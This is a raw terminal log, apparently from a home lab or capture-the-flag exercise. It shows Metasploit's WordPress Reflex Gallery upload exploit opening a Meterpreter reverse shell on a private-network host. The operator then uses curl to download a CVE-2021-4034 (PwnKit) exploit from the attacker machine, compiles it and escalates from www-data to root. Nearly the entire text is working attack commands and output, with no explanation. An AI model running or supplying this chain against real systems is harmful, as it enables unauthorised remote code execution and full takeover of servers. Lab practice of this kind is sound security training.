┌──(kali㉿kali)-[~/Downloads]
└─$ msfconsole
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                                                                                                                                                           
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                                                                                                         
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                                                                                                        
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                                                                       
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                                                                                                                       
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                                                                                                                       
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                                                                                                                       
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                                                                                                                       
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                                                                                                                                                        
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                                                                                                                         
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                                                                                                                          
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                                                                                                                           
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                                                                                                                                            
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                                                                                                                                              
           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                                                                                                                
             ;kOOOOOOOOOOOOOOOk:                                                                                                                                                                                  
               ,xOOOOOOOOOOOx,                                                                                                                                                                                    
                 .lOOOOOOOl.                                                                                                                                                                                      
                    ,dOd,                                                                                                                                                                                         
                      .                                                                                                                                                                                           

       =[ metasploit v6.3.27-dev                          ]
+ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can upgrade a shell to a Meterpreter 
session on many platforms using sessions -u 
<session_id>                                                                                                                                                                                                      
Metasploit Documentation: https://docs.metasploit.com/

use msf6 > use exploit exploit/unix/webapp/wp_reflexgallery_file_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_reflexgallery_file_upload

[*] Using exploit/unix/webapp/wp_reflexgallery_file_upload
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set rhosts 192.168.58.129
rhosts => 192.168.58.129
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set tageturi secret/
[!] Unknown datastore option: tageturi. Did you mean TARGETURI?
tageturi => secret/
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set targeturi secret/
targeturi => secret/
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

[*] Started reverse TCP handler on 192.168.58.128:4444 
[+] Our payload is at: obwvqGFBCdlSEG.php. Calling payload...
[*] Calling payload...
[*] Sending stage (39927 bytes) to 192.168.58.129
[+] Deleted obwvqGFBCdlSEG.php
[*] Meterpreter session 1 opened (192.168.58.128:4444 -> 192.168.58.129:50042) at 2023-09-29 04:58:34 -0400
ls

meterpreter > ls
Listing: /var/www/html/secret/wp-content/uploads/2023/09
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  5     fil   2023-09-29 04:41:36 -0400  a.txt
100644/rw-r--r--  24    fil   2023-09-29 04:49:47 -0400  test.php

meterpreter > ls
Listing: /var/www/html/secret/wp-content/uploads/2023/09
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  5     fil   2023-09-29 04:41:36 -0400  a.txt
100644/rw-r--r--  24    fil   2023-09-29 04:49:47 -0400  test.php

meterpreter > ls
Listing: /var/www/html/secret/wp-content/uploads/2023/09
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  5     fil   2023-09-29 04:41:36 -0400  a.txt
100644/rw-r--r--  24    fil   2023-09-29 04:49:47 -0400  test.php

meterpreter > ls /
Listing: /
==========

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
040755/rwxr-xr-x  4096      dir   2017-11-14 15:03:09 -0500  bin
040755/rwxr-xr-x  4096      dir   2017-11-14 15:04:15 -0500  boot
040775/rwxrwxr-x  4096      dir   2017-11-14 14:51:55 -0500  cdrom
040755/rwxr-xr-x  3920      dir   2023-09-29 04:15:41 -0400  dev
040755/rwxr-xr-x  12288     dir   2023-09-26 04:57:04 -0400  etc
040755/rwxr-xr-x  4096      dir   2023-09-26 04:31:24 -0400  home
100644/rw-r--r--  41808819  fil   2017-11-14 15:04:15 -0500  initrd.img
040755/rwxr-xr-x  4096      dir   2017-11-14 14:53:12 -0500  lib
040755/rwxr-xr-x  4096      dir   2017-08-01 07:19:00 -0400  lib64
040700/rwx------  16384     dir   2017-11-14 14:45:47 -0500  lost+found
040755/rwxr-xr-x  4096      dir   2017-11-16 16:54:25 -0500  media
040755/rwxr-xr-x  4096      dir   2017-08-01 07:17:46 -0400  mnt
040755/rwxr-xr-x  4096      dir   2017-08-01 07:17:46 -0400  opt
040555/r-xr-xr-x  0         dir   2023-09-29 04:15:23 -0400  proc
040700/rwx------  4096      dir   2023-09-29 04:19:39 -0400  root
040755/rwxr-xr-x  860       dir   2023-09-29 04:37:42 -0400  run
040755/rwxr-xr-x  12288     dir   2017-11-14 15:03:29 -0500  sbin
040755/rwxr-xr-x  4096      dir   2017-04-29 04:38:54 -0400  snap
040755/rwxr-xr-x  4096      dir   2017-08-01 07:17:46 -0400  srv
040555/r-xr-xr-x  0         dir   2023-09-29 04:15:27 -0400  sys
041777/rwxrwxrwx  4096      dir   2023-09-29 04:58:32 -0400  tmp
040755/rwxr-xr-x  4096      dir   2017-08-01 07:24:27 -0400  usr
040755/rwxr-xr-x  4096      dir   2017-11-16 11:14:06 -0500  var
100644/rw-r--r--  7398656   fil   2017-11-14 14:47:14 -0500  vmlinuz

meterpreter > cd ..
meterpreter > ls
Listing: /var/www/html/secret/wp-content/uploads/2023
=====================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2023-09-29 04:58:33 -0400  09

meterpreter > pwd
/var/www/html/secret/wp-content/uploads/2023
meterpreter > i
[-] Unknown command: i
meterpreter > id
[-] Unknown command: id
meterpreter > id
[-] Unknown command: id
meterpreter > whomai
[-] Unknown command: whomai
meterpreter > whoami
[-] Unknown command: whoami
meterpreter > bash
[-] Unknown command: bash
meterpreter > shell
Process 2332 created.
Channel 0 created.
whoami
www-data
cd /tmp/
ls
systemd-private-765e54553cac4a08842db069c2a854a7-colord.service-34yVUM
systemd-private-765e54553cac4a08842db069c2a854a7-rtkit-daemon.service-8E7TNw
systemd-private-765e54553cac4a08842db069c2a854a7-systemd-timesyncd.service-9OMkVB
ls /home    
jeanmich
marlinspike
ls      
systemd-private-765e54553cac4a08842db069c2a854a7-colord.service-34yVUM
systemd-private-765e54553cac4a08842db069c2a854a7-rtkit-daemon.service-8E7TNw
systemd-private-765e54553cac4a08842db069c2a854a7-systemd-timesyncd.service-9OMkVB
ls
systemd-private-765e54553cac4a08842db069c2a854a7-colord.service-34yVUM
systemd-private-765e54553cac4a08842db069c2a854a7-rtkit-daemon.service-8E7TNw
systemd-private-765e54553cac4a08842db069c2a854a7-systemd-timesyncd.service-9OMkVB
mkdir test
curl -L http://192.168.58.128/CVE-2021-4034-main.zip > exp.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6457  100  6457    0     0   260k      0 --:--:-- --:--:-- --:--:--  274k
unzip exp.zip   
Archive:  exp.zip
55d60e381ef90463ed35f47af44bf7e2fbc150d4
   creating: CVE-2021-4034-main/
  inflating: CVE-2021-4034-main/.gitignore  
  inflating: CVE-2021-4034-main/LICENSE  
  inflating: CVE-2021-4034-main/Makefile  
  inflating: CVE-2021-4034-main/README.md  
  inflating: CVE-2021-4034-main/cve-2021-4034.c  
  inflating: CVE-2021-4034-main/cve-2021-4034.sh  
   creating: CVE-2021-4034-main/dry-run/
  inflating: CVE-2021-4034-main/dry-run/Makefile  
  inflating: CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c  
  inflating: CVE-2021-4034-main/dry-run/pwnkit-dry-run.c  
  inflating: CVE-2021-4034-main/pwnkit.c  
ls
CVE-2021-4034-main
exp.zip
systemd-private-765e54553cac4a08842db069c2a854a7-colord.service-34yVUM
systemd-private-765e54553cac4a08842db069c2a854a7-rtkit-daemon.service-8E7TNw
systemd-private-765e54553cac4a08842db069c2a854a7-systemd-timesyncd.service-9OMkVB
test
cd CVE-2021-4034-main
ls
LICENSE
Makefile
README.md
cve-2021-4034.c
cve-2021-4034.sh
dry-run
pwnkit.c
make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
ls      
GCONV_PATH=.
LICENSE
Makefile
README.md
cve-2021-4034
cve-2021-4034.c
cve-2021-4034.sh
dry-run
gconv-modules
pwnkit.c
pwnkit.so
./cve-2021-4034
whoami
root
